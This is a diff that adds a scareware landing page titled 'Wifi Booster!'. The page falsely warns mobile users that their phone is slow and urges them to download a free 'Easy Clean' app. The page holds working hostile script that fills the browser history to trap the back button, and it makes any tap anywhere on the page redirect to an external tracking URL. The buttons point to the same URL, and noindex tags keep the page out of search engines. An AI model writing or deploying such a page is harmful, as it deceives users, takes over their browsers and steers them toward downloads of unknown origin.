@@ -1,0 +1,56 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head>
+  <base href="">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <title>Wifi Booster!</title>
+    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon"> 
+   <style type="text/css"> body { width: 100%; color: #333; font-family: Tahoma, Geneva, sans-serif; } .enterPage { cursor: pointer } .main { margin: 15px; } .main img { text-align: center } .main p { margin-right: 15px; margin-left: 15px; } #but { text-align: center; margin-bottom: 20px; } #but a { background-color: #55aaff; color: #fff; font-size: 130%; font-family: Arial, Helvetica, sans-serif; padding: 12px 45px; display: inline-block; text-decoration: none; cursor: pointer; border: 0; border-radius: 4px; transition: background-color .2s linear; -webkit-transition: background-color .2s linear; -moz-transition: background-color .2s linear; } #gp { color: #777; font-size: 80%; padding-top: 5px }</style>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+        }
+    </script>
+    
+    <!--?php $actual_link='http://' .$_SERVER[ 'HTTP_HOST'].$_SERVER[ 'REQUEST_URI']; ?-->
+    <script type="text/javascript">
+        ! function () {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+                onpopstate = function (t) {
+                    t.state && location.replace("")
+                }
+            } catch (o) {}
+        }();
+    </script>
+    
+    <script>
+        function goto() {
+            location.href = "http://paotohkia.warriorize.com/?utm_medium=6acd28d389b150b95365953995970caf8da27d1f&utm_campaign=nonagad"
+        }
+    </script>
+</head>
+
+<body class="enterPage" onclick="goto();">
+    <div class="main">
+        <p style="text-align:center">
+            <a href="http://paotohkia.warriorize.com/?utm_medium=6acd28d389b150b95365953995970caf8da27d1f&utm_campaign=nonagad"><img class="logo" src="easy.png"> </a>
+        </p>
+        <h4 style="text-align:center;color:#000;">Your mobile phone might be having Slow performance!</h4>
+        <h3 style="font-size:14px;font-weight:bold;text-align: center;padding: 0 10px 0 10px">For faster loading speed, download Easy Clean today for Free!
+</h3>
+        <p style="text-align:left;color:#00a000;">How to install?</p>
+        <p style="font-size:13px;text-align:left"><strong>Step 1. </strong>Download&nbsp;free App from&nbsp;Google PlayStore (1 Mb)
+</p>
+        <p style="font-size:13px; text-align:left"><strong>Step 2. </strong>Open the application and improve the performance of your mobile performance.
+            
+        <br>
+        <div id="but"><a href="http://paotohkia.warriorize.com/?utm_medium=6acd28d389b150b95365953995970caf8da27d1f&utm_campaign=nonagad">GET APP NOW!</a> </div>
+    </div>
+</body></html>
